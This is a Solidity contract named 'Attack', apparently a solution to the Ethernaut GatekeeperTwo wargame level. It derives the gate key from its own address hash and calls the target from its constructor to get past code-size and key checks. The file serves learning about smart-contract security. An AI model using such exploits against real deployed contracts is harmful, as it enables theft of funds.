// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GateKeeperTwo{
    function enter(bytes8) external returns (bool);
}

contract Attack{
    bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
    GateKeeperTwo public target;

    constructor(address victim){
        target = GateKeeperTwo(victim);
        target.enter(key);
    }
}